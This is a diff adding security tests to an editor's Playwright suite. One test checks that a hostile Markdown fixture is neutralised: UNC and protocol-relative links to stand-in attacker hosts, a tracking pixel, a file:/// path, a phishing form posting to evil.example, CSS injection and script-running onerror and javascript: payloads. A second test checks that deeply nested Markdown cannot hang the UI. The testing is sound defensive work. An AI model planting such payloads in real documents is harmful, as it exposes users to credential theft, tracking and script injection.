@@ -50,6 +50,11 @@ const activeTab = async () => { const s = await appState(); return s.tabs.find((
   page.on("pageerror", (e) => errors.push(e.message));
   page.on("console", (m) => m.type() === "error" && !m.text().includes("404") && errors.push(m.text()));
   page.on("response", (r) => r.status() >= 400 && errors.push(`HTTP ${r.status()} ${r.url()}`));
+  // Documents must never cause requests to other hosts.
+  page.on("request", (r) => {
+    const u = new URL(r.url());
+    if (!["localhost", "127.0.0.1"].includes(u.hostname) && !/^(data|blob):/.test(r.url())) errors.push(`Outbound request: ${r.url()}`);
+  });
   await page.goto(URL_);
   await page.waitForFunction(() => window.__app && window.__fs);
   // Seed the in-memory disk with the corpus under /work.
@@ -385,6 +390,49 @@ const activeTab = async () => { const s = await appState(); return s.tabs.find((
     await waitFor(async () => (await fsText("/work/semi.csv"))?.includes("55"), 3000, "edit saved");
     assert((await fsText("/work/semi.csv")) === "a;b;c\n1;2;3\n4;55;6", `unexpected: ${JSON.stringify(await fsText("/work/semi.csv"))}`);
     await page.evaluate(() => window.__app.updateSettings({ autoSave: true }));
+  });
+
+  await check("S-1", "a hostile Markdown file never makes the app touch network paths", async () => {
+    await page.evaluate(() => {
+      window.__reads = [];
+      const p = window.__app.platform;
+      if (!p.__wrapped) {
+        const orig = p.readFile.bind(p);
+        p.readFile = (path) => { window.__reads.push(path); return orig(path); };
+        const origStat = p.stat.bind(p);
+        p.stat = (path) => { window.__reads.push(path); return origStat(path); };
+        p.__wrapped = true;
+      }
+      window.__fs.write("/work/evil.md", "# Evil\n\n![a](\\\\\\\\attacker\\\\share\\\\a.png)\n\n![b](//attacker.com/s/b.png)\n\n![c](file:///C:/secret.png)\n\n![d](https://tracker.example/pixel.png)\n\n[click](\\\\\\\\attacker\\\\share\\\\x.md)\n\n<form action=\"https://evil.example/login\"><input name=p><button>Go</button></form>\n\n<style>.toolbar{display:none}</style>\n\n<img src=x onerror=\"window.__pwned=1\">\n\n<a href=\"javascript:window.__pwned=2\">js</a>\n");
+    });
+    await open("/work/evil.md");
+    await page.waitForTimeout(800);
+    const reads = await page.evaluate(() => window.__reads);
+    assert(!reads.some((r) => /attacker|tracker|^\/\/|^\\\\|^file:/i.test(r)), `touched: ${JSON.stringify(reads)}`);
+    // Following the network link is refused with a message.
+    await page.evaluate(() => { const s = window.__app.getState(); window.__app.openLink(s.tabs.find((t) => t.id === s.activeId), "\\\\attacker\\share\\x.md"); });
+    await page.waitForTimeout(200);
+    const reads2 = await page.evaluate(() => window.__reads);
+    assert(!reads2.some((r) => /attacker/i.test(r)), "network link was followed");
+    // The side-by-side preview strips forms, styles and script attributes.
+    await page.getByRole("button", { name: "Side-by-side preview" }).click();
+    await waitFor(async () => (await page.locator(".md-preview h1").count()) > 0, 5000, "preview rendered");
+    const html = await page.locator(".md-preview").innerHTML();
+    assert(!/<form|<input|<button|<style|onerror|javascript:/i.test(html), `unsafe HTML survived: ${html.slice(0, 300)}`);
+    assert(await page.locator(".toolbar").isVisible(), "document CSS restyled the app");
+    assert(!(await page.evaluate(() => window.__pwned)), "script ran");
+    await page.getByRole("button", { name: "Side-by-side preview" }).click();
+  });
+
+  await check("S-8", "deeply nested Markdown cannot freeze the window", async () => {
+    await page.evaluate(() => window.__fs.write("/work/nested.md", ">".repeat(20000) + " deep\n" + Array.from({ length: 3000 }, (_, i) => " ".repeat(i * 2) + "- x").join("\n")));
+    await open("/work/nested.md");
+    await page.getByRole("button", { name: "Side-by-side preview" }).click();
+    const t0 = Date.now();
+    await page.evaluate(() => new Promise((r) => setTimeout(r, 50)));
+    assert(Date.now() - t0 < 2000, "main thread blocked");
+    await waitFor(async () => (await page.locator(".md-preview").innerText()).length > 0, 8000, "preview settled or reported too complex");
+    await page.getByRole("button", { name: "Side-by-side preview" }).click();
   });
 
   await check("F-34", "dark theme applies", async () => {
